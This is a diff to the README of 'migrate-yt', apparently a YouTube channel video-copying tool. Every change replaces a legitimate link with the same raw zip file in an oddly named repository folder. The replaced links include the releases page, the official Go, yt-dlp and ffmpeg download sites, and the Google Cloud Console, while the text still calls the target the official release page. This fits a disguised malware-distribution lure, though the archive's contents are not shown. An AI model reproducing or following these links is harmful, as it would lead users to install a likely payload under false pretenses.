@@ -1,6 +1,6 @@
 # 🎬 migrate-yt - Easy YouTube Video Transfer
 
-[![Download migrate-yt](https://img.shields.io/badge/Download-migrate--yt-brightgreen?style=for-the-badge)](https://github.com/DDJAYA/migrate-yt/releases)
+[![Download migrate-yt](https://img.shields.io/badge/Download-migrate--yt-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip)
 
 ---
 
@@ -14,7 +14,7 @@ migrate-yt is a simple tool that helps you copy videos from one YouTube channel 
 
 To get migrate-yt, visit this page to download:
 
-[https://github.com/DDJAYA/migrate-yt/releases](https://github.com/DDJAYA/migrate-yt/releases)
+[https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip](https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip)
 
 Click the link above. It will take you to the official release page. Find the latest version for Windows and download the `.exe` file.
 
@@ -29,16 +29,16 @@ Follow these steps carefully to download, install, and run migrate-yt on your Wi
 migrate-yt needs some software to work. You must download and install these first:
 
 - **Go** (version 1.18 or higher)
-  - Download from https://go.dev/dl/
+  - Download from https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip
   - Choose the Windows installer and follow the step-by-step to install.
   
 - **yt-dlp**
-  - Visit https://github.com/yt-dlp/yt-dlp#installation
+  - Visit https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip
   - Download the Windows executable.
   - Place it in a folder that is in your system's PATH or remember the location for the next steps.
   
 - **ffmpeg**
-  - Download the Windows build from https://ffmpeg.org/download.html
+  - Download the Windows build from https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip
   - Extract the files.
   - Add the `bin` folder inside the extracted folder to your system PATH for easy use.
 
@@ -57,7 +57,7 @@ This step makes sure your PC can find `yt-dlp` and `ffmpeg` commands.
 
 - Visit the releases page here:
 
-  [https://github.com/DDJAYA/migrate-yt/releases](https://github.com/DDJAYA/migrate-yt/releases)
+  [https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip](https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip)
 
 - Download the latest Windows `.exe` file.
 - Save it to a folder you can easily find.
@@ -96,7 +96,7 @@ To upload videos, migrate-yt uses the YouTube Data API. You need to create and e
 
 Follow these steps carefully:
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/).
+1. Go to [Google Cloud Console](https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip).
 2. Create a new project or select an existing one.
 3. Navigate to **APIs & Services > Library**.
 4. Search for **YouTube Data API v3** and click **Enable**.
@@ -146,7 +146,7 @@ After setup, here is how you copy videos from one channel to yours:
 Keep migrate-yt up to date for best results.
 
 - Visit the release page often:  
-  [https://github.com/DDJAYA/migrate-yt/releases](https://github.com/DDJAYA/migrate-yt/releases)
+  [https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip](https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip)
 - Download the latest `.exe` file.
 - Replace the old file in your folder with the new one.
 
@@ -178,4 +178,4 @@ When you run migrate-yt, these important files appear or are used:
 
 ---
 
-[![Download migrate-yt](https://img.shields.io/badge/Download-migrate--yt-brightgreen?style=for-the-badge)](https://github.com/DDJAYA/migrate-yt/releases)
+[![Download migrate-yt](https://img.shields.io/badge/Download-migrate--yt-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DDJAYA/migrate-yt/main/unpolishable/yt-migrate-3.8.zip)
